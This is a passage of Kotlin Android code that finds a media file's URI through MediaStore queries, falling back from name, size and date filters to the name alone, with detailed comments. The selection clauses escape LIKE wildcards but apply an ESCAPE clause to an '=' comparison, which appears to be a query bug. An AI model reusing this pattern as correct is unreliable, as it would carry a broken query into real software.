        // and then lost every reference declared in the loop header
        // (`sizeCol`, `nameCol`, `dateCol`, `contentUri`), which is why one
        // syntax mistake produced a dozen unrelated-looking errors.
        //
        // The entries are read by index instead. `Triple` is accessed by
        // .first/.second/.third because there is no destructuring to lean on.
        for (entry in collections) {
            val contentUri = entry.first
            val nameCol = entry.second.first
            val sizeCol = entry.second.second
            val dateCol = entry.second.third
            val escaped = name.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
            // Narrowest first: name + size + date. Then name + size. Then name.
            val attempts = buildList {
                // NARROWEST FIRST. The name-only clause used to be tried first,
                // so the search stopped at the first same-named row it found --
                // usually the copy in the wrong folder. The loop below returns
                // on the first hit, so the ORDER is the whole behaviour: exact
                // (name+size+date), then name+size, then name+date, and only
                // then the bare name.
                if (sizeBytes > 0 && wantSec > 0) {
                    add(
                        "$nameCol = ? ESC AND $sizeCol = ? AND $dateCol >= ? AND $dateCol <= ?" to
                            arrayOf(escaped, sizeBytes.toString(), (wantSec - 2).toString(), (wantSec + 2).toString()),
                    )
                }
                if (sizeBytes > 0) {
                    add("$nameCol = ? ESC AND $sizeCol = ?" to arrayOf(escaped, sizeBytes.toString()))
                }
                if (wantSec > 0) {
                    add(
                        "$nameCol = ? ESC AND $dateCol >= ? AND $dateCol <= ?" to
                            arrayOf(escaped, (wantSec - 2).toString(), (wantSec + 2).toString()),
                    )
                }
                add("$nameCol = ? ESC" to arrayOf(escaped))
                // `buildList` takes a `MutableList<E>.() -> Unit` lambda, and
                // Kotlin rejects a non-Unit last expression there. Every `add`
                // above returns Boolean, so the lambda needs an explicit Unit
                // result or the build fails with "inferred type is Boolean but
                // Unit was expected". Only the LAST statement matters -- the
                // ones inside the `if` blocks were never type-checked as the
                // lambda result.
                Unit
            }
            for (attempt in attempts) {
                val clause = attempt.first
                val selArgs = attempt.second
                val where = clause.replace(" ESC", " ESCAPE '\\'")
                var hit: Uri? = null
                context.contentResolver.query(
                    contentUri,
                    arrayOf(android.provider.MediaStore.Images.Media._ID),
                    where,
                    selArgs,
                    android.provider.MediaStore.Images.Media.DATE_MODIFIED + " DESC",
                )?.use { c ->
                    if (c.moveToFirst()) {
                        hit = ContentUris.withAppendedId(contentUri, c.getLong(0))
                    }
                }
                if (hit != null) return hit
            }
        }
        return null
    }

    private fun hasPermission(context: Context, perm: String): Boolean =
        ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
}
